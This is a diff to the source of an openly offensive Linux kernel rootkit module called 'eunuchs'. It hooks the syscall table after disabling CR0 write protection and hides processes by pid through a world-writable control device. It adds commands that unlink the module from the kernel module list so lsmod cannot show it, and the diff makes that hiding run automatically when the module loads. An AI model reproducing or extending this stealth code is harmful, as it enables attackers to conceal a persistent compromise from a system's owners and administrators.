@@ -6,7 +6,6 @@
  * hide/show files
  * setuid 0 (kill command/signals ?)
  * /etc/passwd & /etc/shadow
- * hide lkm?
  **/
 
 /**
@@ -59,19 +58,19 @@ LIST_HEAD(proc_hide_by_pid_list);
 static struct class *eunuchs_cl;    // for class descriptor
 static int eunuchs_dev_maj_number;  // major number for device
 
-int eunuchs_char_open(struct inode *i, struct file *f)
+static int eunuchs_char_open(struct inode *i, struct file *f)
 {
     /* [> printk("device open()\n"); <] */
     return 0;
 }
 
-int eunuchs_char_release(struct inode *i, struct file *f)
+static int eunuchs_char_release(struct inode *i, struct file *f)
 {
     /* [> printk("device release()\n"); <] */
     return 0;
 }
 
-ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
+static ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
 {
     /* [> printk("device read()\n"); <] */
     debug("read() got [%s] [%d bytes]\n", buf, len);
@@ -87,13 +86,16 @@ ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *
  *
  * Commands:
  *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
+ *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
+ *                                    remove the LKM until after you make it visible)
+ *  lemmesee                        - show the LKM in lsmod
  *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
  *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
  *
  *
  * TODO: implement further interaction options for this to be able to control the lkm.
  **/
-ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
+static ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
     char a[len+1];
     size_t i;
@@ -110,7 +112,15 @@ ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, l
 
     debug("write() got [%s] [%d bytes]\n", a, len);
 
-    if(strncmp(a, "ohaiplzhideproc ", 16) == 0)
+    if(strncmp(a, "kthxbye", 7) == 0)
+    {
+        eunuchs_hide_lkm();
+    }
+    else if(strncmp(a, "lemmesee", 8) == 0)
+    {
+        eunuchs_show_lkm();
+    }
+    else if(strncmp(a, "ohaiplzhideproc ", 16) == 0)
     {
         char *p = a + 16;
         debug("hiding pid %s\n", p);
@@ -148,7 +158,7 @@ static struct file_operations eunuchs_fops =
  * eunuchs_devnode(struct device*, umode_t*) -
  *  Changes the permissions on the char device to be 0666
  **/
-char* eunuchs_devnode(struct device *dev, umode_t *mode)
+static char* eunuchs_devnode(struct device *dev, umode_t *mode)
 {
     if(mode)
         *mode = 0666;
@@ -159,7 +169,7 @@ char* eunuchs_devnode(struct device *dev, umode_t *mode)
  * eunuchs_dev_init() -
  *  Creates a char device so that we can communicate with the lkm from userland
  **/
-int eunuchs_dev_init()
+static int eunuchs_dev_init()
 {
     if((eunuchs_dev_maj_number = register_chrdev(0, EUNUCHS_DEVICE_NAME, &eunuchs_fops)) < 0)
     {
@@ -191,7 +201,7 @@ int eunuchs_dev_init()
  * enuchs_dev_remove() -
  *  Removes the char device
  **/
-int eunuchs_dev_remove()
+static int eunuchs_dev_remove()
 {
     device_destroy(eunuchs_cl, MKDEV(eunuchs_dev_maj_number, 0));
     class_destroy(eunuchs_cl);
@@ -209,7 +219,7 @@ static typeof(sys_getdents64) *orig_getdents64;
 /**
  * read() handler
  **/
-asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
+static asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
 {
     /* printk("reading..\n"); */
     return orig_read(fd, buf, count);
@@ -218,7 +228,7 @@ asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
 /**
  * getdents() handler. Probably not needed. What calls this explicitly?
  **/
-asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp, unsigned int count)
+static asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp, unsigned int count)
 {
     /* debug("got getdents call\n"); */
     return orig_getdents(fd, fp, count);
@@ -228,7 +238,7 @@ asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp,
  * getdents64() handler. This is used for large filesystems, and seems to be
  * what ls uses.
  **/
-asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user *fp, unsigned int count)
+static asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user *fp, unsigned int count)
 {
     /* debug("got getdents64 call\n"); */
     return orig_getdents64(fd, fp, count);
@@ -242,7 +252,7 @@ static unsigned original_cr0;
  * cr0_enable_write() -
  *  Twiddles CR0 to enable writing to read-only memory
  **/
-void cr0_enable_write()
+static void cr0_enable_write()
 {
     unsigned cr0 = 0;
     debug("disabling page write protection\n");
@@ -259,7 +269,7 @@ void cr0_enable_write()
  * cr0_disable_write() -
  *  Twiddles CR0 to disable writing to read-only memory
  **/
-void cr0_disable_write()
+static void cr0_disable_write()
 {
     debug("restoring write protection on cr0\n");
     asm volatile("movl %%eax, %%cr0"
@@ -277,7 +287,7 @@ void cr0_disable_write()
  * hide_proc_by_pid(char *) -
  *  Hides a specified pid.
  **/
-int hide_proc_by_pid(char *pid)
+static int hide_proc_by_pid(char *pid)
 {
     eunuchs_proc_hide_by_pid *hide = kmalloc(sizeof(eunuchs_proc_hide_by_pid), GFP_KERNEL);
     if(hide == NULL)
@@ -293,7 +303,7 @@ int hide_proc_by_pid(char *pid)
  * show_proc_by_pid(char *) -
  *  Shows a specified pid.
  **/
-int show_proc_by_pid(char *pid)
+static int show_proc_by_pid(char *pid)
 {
     eunuchs_proc_hide_by_pid *show = NULL, *tmp = NULL;
     list_for_each_entry_safe(show, tmp, &proc_hide_by_pid_list, list)
@@ -404,7 +414,7 @@ static void process_hide_remove(void)
 // LIST FUNCTIONS
 
 #ifdef DEBUG
-int eunuchs_lists_show_all(void)
+static int eunuchs_lists_show_all(void)
 {
     eunuchs_proc_hide_by_pid *p = NULL;
 
@@ -420,7 +430,7 @@ int eunuchs_lists_show_all(void)
  * eunuchs_lists_init() -
  *  Initializes our linked lists which control hide/show of certain things.
  **/
-int eunuchs_lists_init(void)
+static int eunuchs_lists_init(void)
 {
     // add default username to hide processes by
     /*
@@ -447,7 +457,7 @@ int eunuchs_lists_init(void)
  *  Frees all lists. Note that we have to use the _safe version of for_each, due
  *  to changing the structure of the list, to avoid null pointer exceptions.
  **/
-void eunuchs_lists_free(void)
+static void eunuchs_lists_free(void)
 {
     /* eunuchs_proc_hide_by_user *ud = NULL, *ud2 = NULL; */
     eunuchs_proc_hide_by_pid *pd = NULL, *pd2 = NULL;
@@ -477,11 +487,40 @@ void eunuchs_lists_free(void)
 ////////////////////////////////////////////////////////////////////////////////
 // MAIN DRIVERS
 
+static struct list_head *mod_list = NULL;
+
+/**
+ * eunuchs_hide_lkm() -
+ *  Hides the module from `lsmod`
+ **/
+static int eunuchs_hide_lkm(void)
+{
+    debug("Hiding LKM from lsmod\n");
+    mod_list = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    return 0;
+}
+
+/**
+ * eunuchs_show_lkm() -
+ *  Allows the module to be visible in `lsmod`
+ **/
+static int eunuchs_show_lkm(void)
+{
+    debug("Showing LKM in lsmod\n");
+    if(mod_list)
+    {
+        list_add(&THIS_MODULE->list, mod_list);
+        mod_list = NULL;
+    }
+    return 0;
+}
+
 /**
  * eunuchs_hooks_install() -
  *  Installs our hooks, saving the old system call function pointers
  **/
-int eunuchs_hooks_install(void)
+static int eunuchs_hooks_install(void)
 {
     debug("installing hooks\n");
 
@@ -501,7 +540,7 @@ int eunuchs_hooks_install(void)
  * eunuchs_hooks_remove() -
  *  Removes our hooks, restoring the original system call function pointers.
  **/
-void eunuchs_hooks_remove(void)
+static void eunuchs_hooks_remove(void)
 {
     debug("removing hooks\n");
     sct[__NR_read] = (void *)orig_read;
@@ -512,7 +551,7 @@ void eunuchs_hooks_remove(void)
 /**
  * Initializes the LKM.
  **/
-int eunuchs_init(void)
+static int eunuchs_init(void)
 {
     debug("init\n");
 
@@ -530,6 +569,8 @@ int eunuchs_init(void)
     process_hide_init();
     cr0_disable_write();
 
+    /* hide the module */
+    eunuchs_hide_lkm();
 
     return 0;
 }
@@ -537,9 +578,11 @@ int eunuchs_init(void)
 /**
  * Unloads the LKM.
  **/
-void eunuchs_exit(void)
+static void eunuchs_exit(void)
 {
     debug("exit\n");
+
+    eunuchs_show_lkm();
 
     cr0_enable_write();
     eunuchs_hooks_remove();
